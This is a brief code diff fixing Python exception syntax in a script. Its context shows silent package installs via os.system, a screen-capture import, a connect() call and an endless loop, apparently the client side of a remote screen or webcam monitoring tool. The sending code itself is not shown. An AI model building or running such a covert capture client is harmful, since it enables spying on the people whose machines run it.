@@ -89,15 +89,15 @@ def connect():
 def main():
      try :
           import pip
-     except ImportError:
+     except (ImportError,ModuleNotFoundError):
           ensurepip.bootstrap()
      try:
           import cv2
-     except ImportError,ModuleNotFoundError:
+     except (ImportError,ModuleNotFoundError):
           os.system("python -m pip install opencv-python")
      try:
           from PIL import ImageGrab
-     except ImportError,ModuleNotFoundError:
+     except (ImportError,ModuleNotFoundError):
           os.system("python -m pip install pillow")
      c,s=connect()
      while True:
